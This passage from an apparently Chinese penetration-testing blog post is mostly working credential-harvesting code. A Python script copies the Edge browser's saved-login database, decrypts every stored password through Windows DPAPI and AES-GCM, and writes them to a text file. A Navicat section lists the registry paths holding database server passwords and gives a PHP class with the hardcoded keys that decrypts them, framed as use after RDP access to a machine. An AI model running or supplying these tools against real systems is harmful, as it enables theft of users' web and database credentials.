class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Microsoft\Edge\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cipher</span>(<span class="params">key</span>):</span></span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DATA_BLOB</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unix_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_from_local_state</span>():</span></span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Microsoft\Edge\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span></span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h2 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h2><h3 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h3><p>目前测试只能解密11和12两个版本，其他版本未测试</p><table><thead><tr><th align="left">数据库类型</th><th align="center">注册表路径</th></tr></thead><tbody><tr><td align="left">MySQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td align="left">MariaDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td align="left">MongoDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td align="left">Microsoft SQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td align="left">Oracle</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td align="left">PostgreSQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td align="left">SQLite</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></tbody></table><h4 id="能RDP连接到机器"><a href="#能RDP连接到机器" class="headerlink" title="能RDP连接到机器"></a>能RDP连接到机器</h4><p>当前已Mysql作为测试样例，通过注册列表中查看，位置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/18.png" alt="image-20210610163933891"></p><p>接着把加密的密码复制出来进行解密，脚本如下，如果本机没有PHP环境可以使用<a href="https://tool.lu/coderunner/">在线网站</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FatSmallTools</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowKey = sha1(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowIv = hex2bin(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_encrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = openssl_encrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="keyword">$this</span>-&gt;decryptBlock(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FatSmallTools</span>\<span class="title">NavicatPassword</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> NavicatPassword(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//填上你的加密的密码</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;decrypt(<span class="string">&#x27;EF176B08C2D7735DB81C&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h4 